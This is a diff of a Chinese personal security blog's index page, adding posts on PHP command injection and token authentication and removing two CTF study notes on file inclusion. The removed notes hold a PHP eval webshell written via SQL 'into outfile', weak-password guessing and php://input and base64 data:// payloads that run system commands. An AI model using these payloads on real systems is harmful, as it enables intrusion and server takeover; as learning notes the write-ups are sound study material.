@@ -146,6 +146,137 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2022/02/22/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/php%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">php命令注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-22 23:58:16 / Modified: 23:58:52" itemprop="dateCreated datePublished" datetime="2022-02-22T23:58:16+08:00">2022-02-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>   Command Injection，即命令注入攻击，是指由于嵌入式应用程序或者 web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，<br>将数据提交至应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。<br> 在命令注入的漏洞中，最为常见的是PHP的命令注入。PHP命令注入攻击存在的主要原因是Web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交<br>的数据内容没有进行严格的过滤就带入函数中执行而造成的。例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施进一步的渗透攻击。</p>
+<p>原理：web应用在调用这些函数执行系统命令的时候，在没有做好过滤用户输入的情况下，如果用户将自己的输入作为系统命令的参数拼接到命令行中，就会造成命令注（命令执行）的漏洞。<br>嵌入式应用程序或者 web应用程序有时需要调用一些系统命令的函数，如linux C中的system()，exec()，shell-exec() 等等，当用户能够控制这些函数中的参数时，<br>就可以将恶意参系统命令拼接到正常命令中，从而造成命令注入攻击设备系统：</p>
+<p>命令注入的形成需要如下三个条件：</p>
+<p>1）使用了内部调用shell的函数：system()，exec()等<br>2）将外界传入的参数没有足够的过滤，直接传递给内部调用shell的函数<br>3）参数中shell的元字符没有被转义<br>Ps：DOS命令，计算机术语，是指DOS操作系统的命令，是一种面向磁盘的操作命令，主要包括目录操作类命令、磁盘操作类命令、文件操作类命令和其它命令。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2022/02/22/token/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/token/" class="post-title-link" itemprop="url">token</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-02-22 23:57:32 / Modified: 23:58:04" itemprop="dateCreated datePublished" datetime="2022-02-22T23:57:32+08:00">2022-02-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>传统身份验证的方法<br>1、HTTP是一种没有状态的协议，也就是它并不知道是谁是访问应用<br>    ⑴客户端使用用户名还有密码通过了身份验证，不过下回这个客户端再发送请求时候，还得再验证一下用户名密码，这样就显得很麻烦</p>
+<p>2、解决的方法就是，当用户请求登录的时候，如果没有问题，我们在服务端生成一条记录，这个记录里可以说明一下登录的用户是谁，然后把这条记录的ID号发送给客户端<br>    ⑴客户端收到以后把这个ID号存储在Cookie里，下次这个用户再向服务端发送请求的时候，可以带着这个Cookie，这样服务端会验证一个这个Cookie里的信息，看看能不能在服务端这里找到对应的记录<br>    ⑵如果可以，说明用户已经通过了身份验证，就把用户请求的数据返回给客户端</p>
+<p>3、上面说的就是Session，我们需要在服务端存储为登录的用户生成的Session，这些Session可能会存储在内存，磁盘，或者数据库里。我们可能需要在服务端定期的去清理过期的Session</p>
+<p>Token<br>1、用户第一次登录，服务器通过数据库校验其UserId和Password合法，则再根据随机数字+userid+当前时间戳再经过DES加密生成一个token串<br>    ⑴当然具体生成token的方式是开发自己定义的</p>
+<p>2、token的生成一般是采用uuid保证唯一性，当用户登录时为其生成唯一的token，存储一般保存在数据库中<br>    ⑴token过期时间采用把token二次保存在cookie或session里面，根据cookie和session的过期时间去维护token的过期时间</p>
+<p>3、Token是在服务端产生的。如果前端使用用户名/密码向服务端请求认证，服务端认证成功，那么在服务端会返回Token给前端。前端可以在每次请求的时候带上Token证明自己的合法地位</p>
+<p>4、Token，就是令牌，最大的特点就是随机性，不可预测。一般黑客或软件无法猜测出来</p>
+<p>Token的身份验证方法<br>1、使用基于Token的身份验证方法，在服务端不需要存储用户的登录记录(只保留用户签名过程中的加密算法和密钥即可)</p>
+<p>2、大概的流程是这样的：<br>    ⑴当客户端第一次请求时，发送用户信息至服务器(用户名、密码)，服务器对用户信息使用HS256算法及密钥进行签名，再将这个签名和数据一起作为Token一起返回给客户端<br>    ⑵服务器不保存Token，客户端保存Token(比如放在Cookie里或者Local Storage里)<br>    ⑶当客户端再次发送请求时，在请求信息中将Token一起发给服务器<br>    ⑷服务器用同样的HS256算法和同样的密钥，对数据再进行一次签名，和客户端返回的Token的签名进行比较，如果验证成功，就向客户端返回请求的数据</p>
+<p>3、请求参数中带token<br>    ⑴用户在调用需要登录操作的接口时，无需传递userid和password即可完成操作(因为token代表登录成功)<br>    ⑵服务器控制过期时间，假如一个极端情况，服务器端的token规则泄露，则可以控制用户可以重新登录，获取新的token</p>
+<p>4、当然，token也是可以保存在专门一张数据库表中的<br>    ⑴将用户名、用户生成的token信息等放到一张表中<br>    ⑵用户每次请求时，从前端获取token，然后去表中进行查询<br>        ①如果未查询到，那么说明校验失败<br>        ②如果查询到，说明校验通过：通过token来获取用户名(用户信息)<br>    ⑶总的来说就是不同的设计人员可能有不同的实现方式，总的来说还是差不多的<br>转自csdn</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2022/02/21/uploads%E5%AD%A6%E4%B9%A0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -683,126 +814,6 @@ if(isset($file)){
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">黑盾杯学习3（文件包含问题）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-11-03 21:40:38 / Modified: 21:41:40" itemprop="dateCreated datePublished" datetime="2021-11-03T21:40:38+08:00">2021-11-03</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>三，用data伪协议去写一句话木马<br> <?php eval($_POST[v])?>.<br>开启菜刀输入木马地址（url地址）<br>—————————————————–方法分割线——————————————————-<br>四<br>用dirsurch 御剑扫（C:\工具\tools.zip\合天tool\网站信息收集\网站源码泄露）<br>Phpadmin mysql图形化管理工具<br>找到数据库中phpadmin 可以打开数据库或者写入马<br>打开数据库后可以进行猜测root root 空密码 123456 暴力破解</p>
-<p>内置数据库<br>3.数据库写马<br>select””into outfile “”;    select后可写一句话木马，outflie是路径<br>常用路径<br>linux –&gt;/tmp  路径可为/tmp/shell.php 一句话木马为 <?php eval($_POST[v])?><br>前提 secure_file_priv为空允许写入写出文件<br>为null则不可以，只能在该路径<br>打开phpadmin sql写入show variables like ‘secure_file_priv’<br>若可以则在此处写一句话木马select”<?php eval($_POST[v])?>“into outfile “/tmp/shell.php”<br>Linux中url一般在/var/www 进行文件包含打开菜刀 输入page参数<br>即为网址＋？page=../../tmp/shell.php 密码是v</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://aomandetiankong.github.io/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">黑盾杯学习2（文件包含问题）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-10-27 13:08:13 / Modified: 13:09:47" itemprop="dateCreated datePublished" datetime="2021-10-27T13:08:13+08:00">2021-10-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>ps:原题为攻防世界web进阶第四题<br>Web php include文件包含问题<br>查看源码，进行分析<br>发现hello变量和page变量<br>Page过滤了php://<br>在网址后加上？与变量=传输内容<br>文件包含<br>Php伪协议php://input 把想构造的东西通过post传入<br>Php://fitter/ 写入，写出文件<br>data://text/plain 与1类似<br>！应对过滤方法<br>1.大小写改动<br>2.更换输入方式，例如php改成data<br>F12打开hackbar<br>√postdata<br>然后开始尝试ls执行系统命令php   <?php system('ls')?><br>2.在后面加入&amp;page=PHP://input后尝试抓包 并写上<?php system('ls')?><br>若ls成功，则为linux环境输入cat 文件名<br>—————————————————–方法分割线——————————————————-<br>方法二，采用data://text/plain</p>
-<p>格式为page=data://text/plain；base64，将<?php system('ls')?>编码即为PD9waHAgc3lzdGVtKCdscycpPz4=<br>接着打开hackbar 下面一样输入 <?php system('ls')?><br>最后将cat 文件名也改成base64形式将url中base64后的改成cat 文件名的base64形式<br>若无反应再查看源代码即可<br>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpPz4=</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -872,7 +883,7 @@ if(isset($file)){
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
